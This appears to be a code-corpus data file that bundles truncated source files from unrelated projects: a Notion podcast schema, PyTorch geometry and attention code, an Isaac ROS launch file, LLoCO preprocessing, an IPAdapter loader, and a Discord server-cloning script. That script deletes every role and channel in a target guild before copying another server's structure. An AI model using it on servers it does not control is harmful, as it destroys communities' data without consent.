    "RICH_TEXT = \"rich_text\"\nURL = \"url\"\nRELATION = \"relation\"\nNUMBER = \"number\"\nDATE = \"date\"\nFILES = \"files\"\nSTATUS = \"status\"\nTITLE = \"title\"\nSELECT = \"select\"\nCHECKBOX = \"checkbox\"\nMULTI_SELECT = \"multi_select\"\n\nbook_properties_type_dict = {\n    \"\u6807\u9898\": TITLE,\n    \"Description\": RICH_TEXT,\n    \"\u97f3\u9891\": RICH_TEXT,\n    \"Eid\": RICH_TEXT,\n    \"\u94fe\u63a5\": URL,\n    \"\u53d1\u5e03\u65f6\u95f4\": DATE,\n    \"\u65f6\u957f\": NUMBER,\n    \"\u65f6\u95f4\u6233\": NUMBER,\n    \"\u72b6\u6001\": STATUS,\n    \"Podcast\": RELATION,\n        \"\u559c\u6b22\": CHECKBOX,\n}\n\nTAG_ICON_URL = \"https://www.notion.so/icons/hourglass_gray.svg\"\n\n\nmovie_properties_type_dict = {\n    \"\u64ad\u5ba2\": TITLE,\n    \"Brief\": RICH_TEXT,\n    \"Description\": RICH_TEXT,\n    \"Pid\": RICH_TEXT,\n    \"\u4f5c\u8005\": RELATION,\n    \"\u5168\u90e8\": RELATION,\n    \"\u6700\u540e\u66f4\u65b0\u65f6\u95f4\": DATE,\n    \"\u94fe\u63a5\": URL,\n    \"\u6536\u542c\u65f6\u957f\": NUMBER,\n}\n{\n    \"\u6807\u9898\": {\n        \"title\": [\n            {\n                \"type\": \"text\",\n                \"text\": {\"content\": \"Vol.224 \u91d1\u8272\u68a6\u4e61\uff1a\u4f60\u77e5\u9053\u4eba\u6700\u5f3a\u5927\u7684\u6b66\u5668\u662f\u4ec0\u4e48\u5417\uff1f\"},\n            }\n        ]\n    },\n    \"Description\": {\n        \"rich_text\": [\n            {\n                \"type\": \"text\",\n                \"text\": {\n                    \"content\": \"\u672c\u671f\u8282\u76ee\u6211\u4eec\u4e00\u8d77\u8bfb\u5c0f\u8bf4\u300a\u91d1\u8272\u68a6\u4e61\u300b\uff0c\u4f5c\u8005\u4f0a\u5742\u5e78\u592a\u90ce\u3002\\n\u300a\u91d1\u8272\u68a6\u4e61\u300b\u51fa\u7248\u4e8e2007\u5e74\uff0c\u8bb2\u8ff0\u4e86\u5e73\u51e1\u7684\u524d\u9001\u8d27\u5458\u9752\u67f3\u96c5\u6625\u88ab\u7a81\u7136\u5f53\u4f5c\u523a\u6740\u9996\u76f8\u7684\u51f6\u624b\uff0c\u906d\u5230\u653f\u5e9c\u901a\u7f09\uff0c\u540c\u65f6\u88ab\u5a92\u4f53\u7092\u4f5c\u7f51\u66b4\uff0c\u6210\u4e3a\u201c\u5341\u6076\u4e0d\u8d66\u7684\u7f6a\u4eba\u201d\uff0c\u56e0\u6b64\u552f\u4e00\u7684\u51fa\u8def\u53ea\u6709\u62fc\u547d\u9003\u8dd1\uff0c\u5728\u60ca\u9669\u7684\u8dd1\u8def\u4e2d\uff0c\u4e0e\u8b66\u65b9\u77ed\u5175\u76f8\u63a5\uff0c\u4e5f\u5f97\u5230\u60c5\u4e49\u76f8\u633a\uff0c\u83ab\u540d\u5176\u5999\u7684\u547d\u8fd0\u6349\u5f04\u4e2d\uff0c\u4ed6\u80fd\u5426\u987a\u5229\u9003\u51fa\u91cd\u56f4\uff1f\u8fd9\u4e2a\u6545\u4e8b\u7684\u7075\u611f\u6765\u81ea\u4e8e\u771f\u5b9e\u5386\u53f2\u4e8b\u4ef6\u201c\u80af\u5c3c\u8fea\u9047\u523a\u6848\u201d\u3002\\n\u4f0a\u5742\u5e78\u592a\u90ce\uff081971-\uff09\uff0c\u65e5\u672c\u4f5c\u5bb6\u30022000\u5e74\u4ee5\u300a\u5965\u675c\u90a6\u7684\u7948\u7977\u300b\u83b7\u5f97\u201c\u65b0\u6f6e\u63a8\u7406\u4ff1\u4e50\u90e8\u5956\u201d\uff0c\u7531\u6b64\u8dfb\u8eab\u6587\u575b\uff0c\u66fe\u4e94\u5ea6\u5165\u56f4\u201c\u76f4\u6728\u5956\u201d\uff0c\u662f\u516c\u8ba4\u7684\u201c\u6587\u575b\u624d\u5b50\u201d\u3002\\n\u4f60\u4f1a\u542c\u5230\uff1a\\n1\u3001\u4ec0\u4e48\u662f\u5957\u8def\uff1f\\n2\u3001\u770b\u201c\u539f\u8457\u201d\u7684\u610f\u4e49\u662f\u4ec0\u4e48\uff1f\\n3\u3001\u300a\u91d1\u8272\u68a6\u4e61\u300b\u548c\u4f0a\u5742\u5e78\u592a\u90ce\u7b80\u4ecb\u3002\\n4\u3001\u5982\u4f55\u7406\u89e3\u4e66\u4e2d\u5173\u4e8e\u7f8e\u56fd\u3001\u6447\u6eda\u3001\u62ab\u5934\u58eb\u3001\u523a\u6740\u603b\u7edf\u7b49\u610f\u8c61\uff1f\\n5\u3001\u7cbe\u5f69\u7247\u6bb5\u5206\u4eab\u3002\\n6\u3001\u4f0a\u5742\u5e78\u592a\u90ce\u7684\u4f5c\u54c1\u4e3a\u4ec0\u4e48\u7545\u9500\uff1f\u600e\u4e48\u7406\u89e3\u201c\u4eba\u7c7b\u6700\u540e\u7684\u6b66\u5668\u662f\u4fe1\u4efb\u201d\u548c\u6807\u9898\u300a\u91d1\u8272\u68a6\u4e61\u300b\uff1f\\n\u7247\u5934\u66f2\uff1a\u975b\u5382\\n\u7247\u5c3e\u66f2\uff1aGolden Slumbers (Remastered 2009)\\n\u4e3b\u64ad\uff1a\u5927\u58f9 / \u8d85\u54e5 / \u661f\u5149\"\n                },\n            }\n        ]\n    },\n    \"\u65f6\u95f4\u6233\": {\"number\": 1712012400},\n    \"\u53d1\u5e03\u65f6\u95f4\": {\n        \"date\": {\"start\": \"2024-04-02 07:00:00\", \"time_zone\": \"Asia/Shanghai\"}\n    },\n    \"\u97f3\u9891\": {\n        \"rich_text\": [\n            {\n                \"type\": \"text\",\n                \"text\": {\n                    \"content\": \"https://jt.ximalaya.com//GKwRINsJ3BQ4An6aiQK-6Qkb-aacv2-48K.m4a?channel=rss&album_id=29887212&track_id=718781905&uid=68693381&jt=https://audio.xmcdn.com/storages/e11f-audiofreehighqps/0B/16/GKwRINsJ3BQ4An6aiQK-6Qkb-aacv2-48K.m4a\"\n                },\n            }\n        ]\n    },\n    \"Eid\": {\n        \"rich_text\": [{\"type\": \"text\", \"text\": {\"content\": \"660b3dad1c3c7de44a82f773\"}}]\n    },\n    \"\u65f6\u957f\": {\"number\": 5169},\n    \"Podcast\": {\"relation\": [{\"id\": \"87723a05-dd9a-494d-a934-9ff4140fcb21\"}]},\n    \"\u94fe\u63a5\": {\"url\": \"hhttps://www.xiaoyuzhoufm.com/episode/660b3dad1c3c7de44a82f773\"},\n    \"\u72b6\u6001\": {\"status\": {\"name\": \"\u5728\u542c\"}},\n}\n",
    "'''\nModified from GaussianShader\n'''\n\nimport torch\n\ndef ndc_2_cam(ndc_xyz, intrinsic, W, H):\n    inv_scale = torch.tensor([[W - 1, H - 1]], device=ndc_xyz.device)\n    cam_z = ndc_xyz[..., 2:3]\n    cam_xy = ndc_xyz[..., :2] * inv_scale * cam_z\n    cam_xyz = torch.cat([cam_xy, cam_z], dim=-1)\n    cam_xyz = cam_xyz @ torch.inverse(intrinsic[0, ...].t())\n    return cam_xyz\n\ndef depth2point_cam(sampled_depth, ref_intrinsic):\n    B, N, C, H, W = sampled_depth.shape\n    valid_z = sampled_depth\n    valid_x = torch.arange(W, dtype=torch.float32, device=sampled_depth.device) / (W - 1)\n    valid_y = torch.arange(H, dtype=torch.float32, device=sampled_depth.device) / (H - 1)\n    valid_y, valid_x = torch.meshgrid(valid_y, valid_x)\n    # B,N,H,W\n    valid_x = valid_x[None, None, None, ...].expand(B, N, C, -1, -1)\n    valid_y = valid_y[None, None, None, ...].expand(B, N, C, -1, -1)\n    ndc_xyz = torch.stack([valid_x, valid_y, valid_z], dim=-1).view(B, N, C, H, W, 3)  # 1, 1, 5, 512, 640, 3\n    cam_xyz = ndc_2_cam(ndc_xyz, ref_intrinsic, W, H) # 1, 1, 5, 512, 640, 3\n    return ndc_xyz, cam_xyz\n\ndef depth2point_world(depth_image, intrinsic_matrix, extrinsic_matrix):\n    # depth_image: (H, W), intrinsic_matrix: (3, 3), extrinsic_matrix: (4, 4)\n    _, xyz_cam = depth2point_cam(depth_image[None,None,None,...], intrinsic_matrix[None,...])\n    xyz_cam = xyz_cam.reshape(-1,3)\n    xyz_world = torch.cat([xyz_cam, torch.ones_like(xyz_cam[...,0:1])], axis=-1) @ torch.inverse(extrinsic_matrix).transpose(0,1)\n    xyz_world = xyz_world[...,:3]\n\n    return xyz_world, xyz_cam\n\ndef depth2point(depth_image, intrinsic_matrix, extrinsic_matrix):\n    # depth_image: (H, W), intrinsic_matrix: (3, 3), extrinsic_matrix: (4, 4)\n    _, xyz_cam = depth2point_cam(depth_image[None,None,None,...], intrinsic_matrix[None,...])\n    xyz_cam = xyz_cam.reshape(-1,3)\n    xyz_world = torch.cat([xyz_cam, torch.ones_like(xyz_cam[...,0:1])], axis=-1) @ torch.inverse(extrinsic_matrix).transpose(0,1)\n    xyz_world = xyz_world[...,:3]\n\n    return xyz_cam.reshape(*depth_image.shape, 3), xyz_world.reshape(*depth_image.shape, 3)\n\ndef depth_pcd2normal(xyz):\n    hd, wd, _ = xyz.shape \n    bottom_point = xyz[..., 2:hd,   1:wd-1, :]\n    top_point    = xyz[..., 0:hd-2, 1:wd-1, :]\n    right_point  = xyz[..., 1:hd-1, 2:wd,   :]\n    left_point   = xyz[..., 1:hd-1, 0:wd-2, :]\n    left_to_right = right_point - left_point\n    bottom_to_top = top_point - bottom_point \n    xyz_normal = torch.cross(left_to_right, bottom_to_top, dim=-1)\n    xyz_normal = torch.nn.functional.normalize(xyz_normal, p=2, dim=-1)\n    xyz_normal = torch.nn.functional.pad(xyz_normal.permute(2,0,1), (1,1,1,1), mode='constant').permute(1,2,0)\n    return xyz_normal\n\ndef normal_from_depth_image(depth, intrinsic_matrix, extrinsic_matrix):\n    # depth: (H, W), intrinsic_matrix: (3, 3), extrinsic_matrix: (4, 4)\n    # xyz_normal: (H, W, 3)\n    _, xyz_cam = depth2point_world(depth, intrinsic_matrix, extrinsic_matrix) # (HxW, 3)\n    xyz_cam = xyz_cam.reshape(*depth.shape, 3)\n    xyz_normal = depth_pcd2normal(xyz_cam)\n\n    return xyz_normal, xyz_cam",
    "# Copyright (c) 2022, NVIDIA CORPORATION.  All rights reserved.\n#\n# NVIDIA CORPORATION and its licensors retain all intellectual property\n# and proprietary rights in and to this software, related documentation\n# and any modifications thereto.  Any use, reproduction, disclosure or\n# distribution of this software and related documentation without an express\n# license agreement from NVIDIA CORPORATION is strictly prohibited.\n\nimport os\nfrom ament_index_python.packages import get_package_share_directory\nfrom launch import LaunchDescription\nfrom launch.substitutions import LaunchConfiguration\nfrom launch_ros.actions import Node\n\n\ndef generate_launch_description():\n\n    map_yaml_file = LaunchConfiguration(\n        \"map_yaml_path\",\n        default=os.path.join(\n            get_package_share_directory(\"isaac_ros_navigation_goal\"), \"assets\", \"carter_warehouse_navigation.yaml\"\n        ),\n    )\n\n    goal_text_file = LaunchConfiguration(\n        \"goal_text_file_path\",\n        default=os.path.join(get_package_share_directory(\"isaac_ros_navigation_goal\"), \"assets\", \"goals.txt\"),\n    )\n\n    navigation_goal_node = Node(\n        name=\"set_navigation_goal\",\n        package=\"isaac_ros_navigation_goal\",\n        executable=\"SetNavigationGoal\",\n        parameters=[\n            {\n                \"map_yaml_path\": map_yaml_file,\n                \"iteration_count\": 3,\n                \"goal_generator_type\": \"RandomGoalGenerator\",\n                \"action_server_name\": \"navigate_to_pose\",\n                \"obstacle_search_distance_in_meters\": 0.2,\n                \"goal_text_file_path\": goal_text_file,\n                \"initial_pose\": [-6.4, -1.04, 0.0, 0.0, 0.0, 0.99, 0.02],\n            }\n        ],\n        output=\"screen\",\n    )\n\n    return LaunchDescription([navigation_goal_node])\n",
    "import discord\r\nfrom colorama import Fore, init, Style\r\n\r\n\r\ndef print_add(message):\r\n    print(f'{Fore.GREEN}[+]{Style.RESET_ALL} {message}')\r\n\r\ndef print_delete(message):\r\n    print(f'{Fore.RED}[-]{Style.RESET_ALL} {message}')\r\n\r\ndef print_warning(message):\r\n    print(f'{Fore.RED}[WARNING]{Style.RESET_ALL} {message}')\r\n\r\n\r\ndef print_error(message):\r\n    print(f'{Fore.RED}[ERROR]{Style.RESET_ALL} {message}')\r\n\r\n\r\nclass Clone:\r\n    @staticmethod\r\n    async def roles_delete(guild_to: discord.Guild):\r\n            for role in guild_to.roles:\r\n                try:\r\n                    if role.name != \"@everyone\":\r\n                        await role.delete()\r\n                        print_delete(f\"Deleted Role: {role.name}\")\r\n                except discord.Forbidden:\r\n                    print_error(f\"Error While Deleting Role: {role.name}\")\r\n                except discord.HTTPException:\r\n                    print_error(f\"Unable to Delete Role: {role.name}\")\r\n\r\n    @staticmethod\r\n    async def roles_create(guild_to: discord.Guild, guild_from: discord.Guild):\r\n        roles = []\r\n        role: discord.Role\r\n        for role in guild_from.roles:\r\n            if role.name != \"@everyone\":\r\n                roles.append(role)\r\n        roles = roles[::-1]\r\n        for role in roles:\r\n            try:\r\n                await guild_to.create_role(\r\n                    name=role.name,\r\n                    permissions=role.permissions,\r\n                    colour=role.colour,\r\n                    hoist=role.hoist,\r\n                    mentionable=role.mentionable\r\n                )\r\n                print_add(f\"Created Role {role.name}\")\r\n            except discord.Forbidden:\r\n                print_error(f\"Error While Creating Role: {role.name}\")\r\n            except discord.HTTPException:\r\n                print_error(f\"Unable to Create Role: {role.name}\")\r\n\r\n    @staticmethod\r\n    async def channels_delete(guild_to: discord.Guild):\r\n        for channel in guild_to.channels:\r\n            try:\r\n                await channel.delete()\r\n                print_delete(f\"Deleted Channel: {channel.name}\")\r\n            except discord.Forbidden:\r\n                print_error(f\"Error While Deleting Channel: {channel.name}\")\r\n            except discord.HTTPException:\r\n                print_error(f\"Unable To Delete Channel: {channel.name}\")\r\n\r\n    @staticmethod\r\n    async def categories_create(guild_to: discord.Guild, guild_from: discord.Guild):\r\n        channels = guild_from.categories\r\n        channel: discord.CategoryChannel\r\n        new_channel: discord.CategoryChannel\r\n        for channel in channels:\r\n            try:\r\n                overwrites_to = {}\r\n                for key, value in channel.overwrites.items():\r\n                    role = discord.utils.get(guild_to.roles, name=key.name)\r\n                    overwrites_to[role] = value\r\n                new_channel = await guild_to.create_category(\r\n                    name=channel.name,\r\n                    overwrites=overwrites_to)\r\n                await new_channel.edit(position=channel.position)\r\n                print_add(f\"Created Category: {channel.name}\")\r\n            except discord.Forbidden:\r\n                print_error(f\"Error While Deleting Category: {channel.name}\")\r\n            except discord.HTTPException:\r\n                print_error(f\"Unable To Delete Category: {channel.name}\")\r\n\r\n    @staticmethod\r\n    async def channels_create(guild_to: discord.Guild, guild_from: discord.Guild):\r\n        channel_text: discord.TextChannel\r\n        channel_voice: discord.VoiceChannel\r\n        category = None\r\n        for channel_text in guild_from.text_channels:\r\n            try:\r\n                for category in guild_to.categories:\r\n                    try:\r\n                        if category.name == channel_text.category.name:\r\n                            break\r\n                    except AttributeError:\r\n                        print_warning(f\"Channel {channel_text.name} doesn't have any category!\")\r\n                        category = None\r\n                        break\r\n\r\n                overwrites_to = {}\r\n                for key, value in channel_text.overwrites.items():\r\n                    role = discord.utils.get(guild_to.roles, name=key.name)\r\n                    overwrites_to[role] = value\r\n                try:\r\n                    new_channel = await guild_to.create_text_channel(\r\n                        name=channel_text.name,\r\n                        overwrites=overwrites_to,\r\n                        position=channel_text.position,\r\n                        topic=channel_text.topic,\r\n                        slowmode_delay=channel_text.slowmode_delay,\r\n                        nsfw=channel_text.nsfw)\r\n                except:\r\n                    new_channel = await guild_to.create_text_channel(\r\n                        name=channel_text.name,\r\n                        overwrites=overwrites_to,\r\n                        position=channel_text.position)\r\n                if cate",
    "import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom typing import Optional, Tuple\nfrom transformers import AutoConfig\n\n# Copied from transformers.models.llama.modeling_llama.repeat_kv\ndef repeat_kv(hidden_states: torch.Tensor, n_rep: int) -> torch.Tensor:\n    \"\"\"\n    This is the equivalent of torch.repeat_interleave(x, dim=1, repeats=n_rep). The hidden states go from (batch,\n    num_key_value_heads, seqlen, head_dim) to (batch, num_attention_heads, seqlen, head_dim)\n    \"\"\"\n    batch, num_key_value_heads, slen, head_dim = hidden_states.shape\n    if n_rep == 1:\n        return hidden_states\n    hidden_states = hidden_states[:, :, None, :, :].expand(batch, num_key_value_heads, n_rep, slen, head_dim)\n    return hidden_states.reshape(batch, num_key_value_heads * n_rep, slen, head_dim)\n\nclass InfiniAttention(nn.Module):\n    def __init__(self, config: AutoConfig, layer_idx: Optional[int] = None):\n        super().__init__()\n        self.config = config\n        self.layer_idx = layer_idx\n        self.hidden_size = config.hidden_size\n        self.num_heads = config.num_attention_heads\n        self.head_dim = self.hidden_size // self.num_heads\n        self.num_key_value_heads = config.num_key_value_heads\n        self.num_key_value_groups = self.num_heads // self.num_key_value_heads\n        self.max_position_embeddings = config.max_position_embeddings\n        self.rope_theta = config.rope_theta\n        self.is_causal = True\n        self.attention_dropout = config.attention_dropout\n\n        if (self.head_dim * self.num_heads) != self.hidden_size:\n            raise ValueError(\n                f\"hidden_size must be divisible by num_heads (got `hidden_size`: {self.hidden_size}\"\n                f\" and `num_heads`: {self.num_heads}).\"\n            )\n        self.q_proj = nn.Linear(self.hidden_size, self.num_heads * self.head_dim, bias=True)\n        self.k_proj = nn.Linear(self.hidden_size, self.num_key_value_heads * self.head_dim, bias=True)\n        self.v_proj = nn.Linear(self.hidden_size, self.num_key_value_heads * self.head_dim, bias=True)\n        self.o_proj = nn.Linear(self.num_heads * self.head_dim, self.hidden_size, bias=False)\n\n        self.rotary_emb = RotaryEmbedding(\n            self.head_dim,\n            max_position_embeddings=self.max_position_embeddings,\n            base=self.rope_theta,\n        )\n\n        self.beta = nn.Parameter(torch.randn(1))\n        self.register_buffer(\"M\", torch.zeros(self.num_heads, self.head_dim, self.head_dim))\n        self.register_buffer(\"z\", torch.zeros(self.num_heads, self.head_dim))\n        self.segment_size = 2048\n\n    def forward(\n        self,\n        hidden_states: torch.Tensor,\n        attention_mask: Optional[torch.Tensor] = None,\n        position_ids: Optional[torch.LongTensor] = None,\n        past_key_value: Optional[Cache] = None,\n        output_attentions: bool = False,\n        use_cache: bool = False,\n        **kwargs,\n    ) -> Tuple[torch.Tensor, Optional[torch.Tensor], Optional[Tuple[torch.Tensor]]]:\n        \n\n        bsz, q_len, _ = hidden_states.size()\n\n        query_states = self.q_proj(hidden_states)\n        key_states = self.k_proj(hidden_states)\n        value_states = self.v_proj(hidden_states)\n\n        query_states = query_states.view(bsz, q_len, self.num_heads, self.head_dim).transpose(1, 2)\n        key_states = key_states.view(bsz, q_len, self.num_key_value_heads, self.head_dim).transpose(1, 2)\n        value_states = value_states.view(bsz, q_len, self.num_key_value_heads, self.head_dim).transpose(1, 2)\n\n        kv_seq_len = key_states.shape[-2]\n        if past_key_value is not None:\n            kv_seq_len += past_key_value.get_usable_length(kv_seq_len, self.layer_idx)\n        cos, sin = self.rotary_emb(value_states, seq_len=kv_seq_len)\n\n        query_states, key_states = apply_rotary_pos_emb(query_states, key_states, cos, sin, position_ids)\n\n        if past_key_value is not None:\n            cache_kwargs = {\"sin\": sin, \"cos\": cos}  # Specific to RoPE models\n            key_states, value_states = past_key_value.update(key_states, value_states, self.layer_idx, cache_kwargs)\n\n\n        if attention_mask is not None:\n            if attention_mask.size() != (bsz, 1, q_len, kv_seq_len):\n                raise ValueError(\n                    f\"Attention mask should be of size {(bsz, 1, q_len, kv_seq_len)}, but is {attention_mask.size()}\"\n                )\n\n\n        # GQA\n        # Memory retrieval and attention calculation per segment\n        memory_output = self._retrieve_from_memory(query_states, self.M, self.z)\n        # Update memory with current segment's key and value states\n        self.M, self.z  = self._update_memory(key_states, value_states, self.M, self.z)\n        key_states = repeat_kv(key_states, self.num_key_value_groups)\n        value_states = repeat_kv(value_states, self.num_key_value_groups)\n\n        causal_mask = attention_mask\n\n        attn_output = torch.nn.functional.scaled_dot_product_attention(\n            query_states,\n    ",
    "import random\n\nimport fire\nimport numpy as np\nimport torch\nfrom auto_compressor import LlocoAutoCompressorModel\nfrom datasets import load_dataset\nfrom needle_util import generate_context\nfrom tqdm import tqdm\nfrom transformers import AutoTokenizer\nfrom utils import load_jsonl\n\ndevice = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n\nRANDOM_NEEDLE_CITIES  = [\n        'Chicago', 'Yangon', 'Antananarivo', 'Colombo', 'Almaty', 'Sydney', 'Chicago', 'Mexico City',\n        'Seattle', 'Lagos', 'Amsterdam', 'Belgrade', 'Cairo', 'Baghdad', 'Damascus', 'Kigali', 'Dakar',\n        'Dakar', 'Sofia', 'Kigali', 'Victoria', 'Tashkent', 'Mumbai', 'Barcelona', 'Almaty', 'Amman',\n        'Toronto', 'Bratislava', 'Johannesburg', 'Thimphu', 'Bangkok', 'Santiago', 'Cairo', 'San Francisco',\n        'Lagos', 'Amsterdam', 'Paris', 'Rabat', 'Santiago', 'Copenhagen', 'Madrid', 'Kigali',\n        'Ho Chi Minh City', 'Sarajevo', 'Delhi', 'Istanbul', 'Ho Chi Minh City', 'Khartoum', 'Helsinki',\n]\n\n\nRANDOM_TEST_NEEDLE_CITIES = [\n        'Doha', 'Istanbul', 'Kuala Lumpur', 'Budapest', 'Shanghai', 'Moscow', 'Los Angeles', 'Oslo',\n        'Johannesburg', 'Berlin', 'Bangalore', 'Tokyo', 'Melbourne', 'Barcelona', 'Chicago', 'Port Louis',\n        'Lisbon', 'Nairobi', 'Kampala', 'Lima', 'Maputo', 'Vancouver', 'Dubai', 'Khartoum', 'Jakarta',\n        'Madrid', 'Yerevan', 'Beirut', 'Athens', 'Chicago', 'Paris', 'Bucharest', 'Copenhagen', 'Brussels',\n        'Damascus', 'Seattle', 'Los Angeles', 'Yerevan', 'Victoria', 'Tunis', 'Astana', 'Seoul',\n        'Buenos Aires', 'Bangkok', 'Colombo', 'Brussels', 'Khartoum', 'Doha', 'San Francisco', 'Vienna', 'Jakarta'\n]\n\ndef generate_random_number(num_digits):\n    lower_bound = 10**(num_digits - 1)\n    upper_bound = 10**num_digits - 1\n    return random.randint(lower_bound, upper_bound)\n\n\nclass EmbeddingPreprocessor(object):\n    def __init__(self, emb_model_name=\"autocomp\", max_length=6144, chunk_size=16, icae_checkpoint=None, truncation=True):\n        self.emb_model_name = emb_model_name\n\n        if self.emb_model_name == \"autocomp\":\n            self.tokenizer = AutoTokenizer.from_pretrained(\"princeton-nlp/AutoCompressor-Llama-2-7b-6k\")\n            self.emb_model = LlocoAutoCompressorModel.from_pretrained(\"princeton-nlp/AutoCompressor-Llama-2-7b-6k\", torch_dtype=torch.bfloat16).eval().cuda()\n            self.tokenizer.pad_token = '[PAD]'\n        else:\n            raise NotImplementedError\n\n        self.max_len = max_length\n        self.chunk_len = chunk_size\n        self.truncation = truncation\n\n    def preprocess_single(self, context):\n        if self.emb_model_name == \"autocomp\":\n            return self.preprocess_context_autocomp(context)\n        else:\n            raise NotImplementedError\n        \n\n    @torch.inference_mode()\n    def preprocess_batch(self, contexts, batch_size=8):\n        assert self.emb_model_name == \"autocomp\"\n        for i in range(0, len(contexts), batch_size):\n            batch = contexts[i:i+batch_size]\n            if self.truncation:\n                context_tokens = self.tokenizer(batch, padding=True, add_special_tokens=False, return_tensors=\"pt\", max_length=6144, truncation=True).input_ids.cuda()\n            else:\n                context_tokens = self.tokenizer(batch, padding=True, add_special_tokens=False, return_tensors=\"pt\", truncation=False).input_ids.cuda()\n            summary_vectors = self.emb_model(context_tokens, segment_lengths=1536, output_softprompt=True).softprompt\n            print(\"summary_vectors\", summary_vectors.shape)\n            return summary_vectors.to(\"cpu\")\n        \n\n    @torch.inference_mode()\n    def preprocess_context_autocomp(self, context):\n        if not self.truncation and len(context) > 10000:\n            context_tokens = []\n            for i in range(0, len(context), 10000):\n                ctx = context[i:i+10000]\n                ctx_tokens = self.tokenizer(ctx, add_special_tokens=False, return_tensors=\"pt\", truncation=False).input_ids\n                context_tokens += ctx_tokens\n            context_tokens = torch.cat(context_tokens)\n            context_tokens = context_tokens[:122880].unsqueeze_(dim=0).cuda()\n        else:\n            if self.truncation:\n                context_tokens = self.tokenizer(context, add_special_tokens=False, return_tensors=\"pt\", max_length=6144, truncation=True).input_ids.cuda()\n            else:\n                context_tokens = self.tokenizer(context, add_special_tokens=False, max_length=120000, return_tensors=\"pt\", truncation=False).input_ids.cuda()\n\n        print(\"context_tokens\", context_tokens.shape)\n        summary_vectors = self.emb_model(context_tokens.long(), segment_lengths=1536, output_softprompt=True).softprompt\n        print(\"summary_vectors\", summary_vectors.shape)\n        return summary_vectors[0].to(\"cpu\")\n\n\ndef preprocess_quality(preprocessor, quality_path, out_path):\n    dataset = load_jsonl(quality_path)\n    cache = {}\n    visited = set()\n    for entry in tqdm(dataset):\n        pid = entr",
    "import torch\nfrom diffusers.pipelines.controlnet import MultiControlNetModel\nfrom transformers import CLIPVisionModelWithProjection, CLIPImageProcessor\nfrom PIL import Image\n\nif hasattr(torch.nn.functional, \"scaled_dot_product_attention\"):\n    from .attention_processor import IPAttnProcessor2_0 as IPAttnProcessor, AttnProcessor2_0 as AttnProcessor, CNAttnProcessor2_0 as CNAttnProcessor\nelse:\n    from .attention_processor import IPAttnProcessor, AttnProcessor, CNAttnProcessor\nfrom .resampler import Resampler\n\nclass ImageProjModel(torch.nn.Module):\n    def __init__(self, cross_attention_dim=1024, clip_embeddings_dim=1024, clip_extra_context_tokens=4):\n        super().__init__()\n        \n        self.cross_attention_dim = cross_attention_dim\n        self.clip_extra_context_tokens = clip_extra_context_tokens\n        self.proj = torch.nn.Linear(clip_embeddings_dim, self.clip_extra_context_tokens * cross_attention_dim)\n        self.norm = torch.nn.LayerNorm(cross_attention_dim)\n        \n    def forward(self, image_embeds):\n        embeds = image_embeds\n        clip_extra_context_tokens = self.proj(embeds).reshape(-1, self.clip_extra_context_tokens, self.cross_attention_dim)\n        clip_extra_context_tokens = self.norm(clip_extra_context_tokens)\n        return clip_extra_context_tokens\n\nclass IPAdapter:\n    def __init__(self, pipe, ipadapter_ckpt_path, image_encoder_path, device=\"cuda\", dtype=torch.float16, resample=Image.Resampling.LANCZOS):\n        self.pipe = pipe\n        self.device = device\n        self.dtype = dtype\n        \n        # load ip adapter model\n        from comfy.utils import load_torch_file\n        ipadapter_model = load_torch_file(ipadapter_ckpt_path, safe_load=True)\n\n        if ipadapter_ckpt_path.lower().endswith(\".safetensors\"):\n            st_model = {\"image_proj\": {}, \"ip_adapter\": {}}\n            for key in ipadapter_model.keys():\n                if key.startswith(\"image_proj.\"):\n                    st_model[\"image_proj\"][key.replace(\"image_proj.\", \"\")] = ipadapter_model[key]\n                elif key.startswith(\"ip_adapter.\"):\n                    st_model[\"ip_adapter\"][key.replace(\"ip_adapter.\", \"\")] = ipadapter_model[key]\n            ipadapter_model = st_model\n            del st_model\n\n        if not \"ip_adapter\" in ipadapter_model.keys() or not ipadapter_model[\"ip_adapter\"]:\n            raise Exception(\"invalid IPAdapter model {}\".format(ipadapter_ckpt_path))\n           \n        # detect features\n        self.is_plus = \"latents\" in ipadapter_model[\"image_proj\"]\n        self.output_cross_attention_dim = ipadapter_model[\"ip_adapter\"][\"1.to_k_ip.weight\"].shape[1]\n        self.is_sdxl = self.output_cross_attention_dim == 2048\n        self.cross_attention_dim = 1280 if self.is_plus and self.is_sdxl else self.output_cross_attention_dim\n        self.heads = 20 if self.is_sdxl and self.is_plus else 12\n        self.num_tokens = 16 if self.is_plus else 4\n\n        # set image encoder\n        #self.image_encoder = CLIPVisionModelWithProjection.from_pretrained(image_encoder_path).to(self.device, dtype=self.dtype)\n        self.image_encoder = image_encoder_path\n        self.clip_image_processor = CLIPImageProcessor(resample=resample, do_rescale=False)\n\n        # set IPAdapter\n        self.set_ip_adapter()\n        self.image_proj_model = self.init_proj() if not self.is_plus else self.init_proj_plus()\n        self.image_proj_model.load_state_dict(ipadapter_model[\"image_proj\"])\n        ip_layers = torch.nn.ModuleList(self.pipe.unet.attn_processors.values())\n        ip_layers.load_state_dict(ipadapter_model[\"ip_adapter\"])\n        \n    def init_proj(self):\n        image_proj_model = ImageProjModel(\n            cross_attention_dim=self.cross_attention_dim,\n            clip_embeddings_dim=self.image_encoder.config.projection_dim,\n            clip_extra_context_tokens=self.num_tokens,\n        ).to(self.device, dtype=self.dtype)\n        return image_proj_model\n    \n    def init_proj_plus(self):\n        image_proj_model = Resampler(\n            dim=self.cross_attention_dim,\n            depth=4,\n            dim_head=64,\n            heads=self.heads,\n            num_queries=self.num_tokens,\n            embedding_dim=self.image_encoder.config.hidden_size,\n            output_dim=self.output_cross_attention_dim,\n            ff_mult=4\n        ).to(self.device, dtype=torch.float16)\n        return image_proj_model\n\n    def set_ip_adapter(self):\n        unet = self.pipe.unet\n        attn_procs = {}\n        for name in unet.attn_processors.keys():\n            cross_attention_dim = None if name.endswith(\"attn1.processor\") else unet.config.cross_attention_dim\n            if name.startswith(\"mid_block\"):\n                hidden_size = unet.config.block_out_channels[-1]\n            elif name.startswith(\"up_blocks\"):\n                block_id = int(name[len(\"up_blocks.\")])\n                hidden_size = list(reversed(unet.config.block_out_channels))[block_id]\n            elif name.startswith(\"down_blocks\"):\n                blo",
